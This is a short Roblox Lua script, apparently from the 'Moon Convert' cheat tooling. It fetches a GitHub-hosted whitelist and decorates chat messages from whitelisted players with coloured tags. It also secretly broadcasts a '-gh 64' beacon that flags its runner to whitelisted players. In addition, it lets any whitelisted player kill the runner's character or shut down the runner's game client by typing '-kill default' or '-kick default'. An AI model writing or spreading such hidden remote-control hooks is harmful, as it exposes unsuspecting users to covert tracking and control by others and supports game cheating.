local whitelistdata = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://github.com/sharkywhiskersmeow/Moon-Convert/raw/main/privatebuild/whitelist.json", true))
local possible = {}

for index, asset in pairs(game:GetService("Players"):GetPlayers()) do
  if whitelistdata[tostring(asset.UserId)] and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
      game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 64")
  end
end

game:GetService("Players").PlayerAdded:Connect(function(asset)
  if whitelistdata[tostring(asset.UserId)] and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
      task.wait(10)
      game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 64")
  end
end)

game:GetService("TextChatService").OnIncomingMessage = function(msg)
  if not msg or not msg.TextSource then return end

  local Player = game:GetService("Players"):GetPlayerByUserId(msg.TextSource.UserId)
  local Text = msg.Text
  local prefix = msg.PrefixText
  local props = Instance.new("TextChatMessageProperties")

  if Text:lower() == "-gh 64" then
    if not whitelistdata[tostring(Player.UserId)] and not table.find(possible, Player) then
    table.insert(possible, Player)
    end
  end





  if whitelistdata[tostring(Player.UserId)] then
    props.PrefixText = "<font color='rgb(" .. whitelistdata[tostring(Player.UserId)].color[1] .. ", " .. whitelistdata[tostring(Player.UserId)].color[2] .. ", " .. whitelistdata[tostring(Player.UserId)].color[3] .. ")'>[" .. whitelistdata[tostring(Player.UserId)].tag .. "]</font> " .. prefix
  elseif table.find(possible, Player) and whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
    props.PrefixText = "<font color='rgb(0, 0, 255)'>[POSSIBLE MOON CONVERT USER]</font> " .. prefix
  end

  if Player.UserId ~= game.Players.LocalPlayer.UserId then
    if whitelistdata[tostring(Player.UserId)] and Text:lower() == "-kill default" then
        game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-kick default" then
        game:Shutdown()
    end
  end
  return props
end
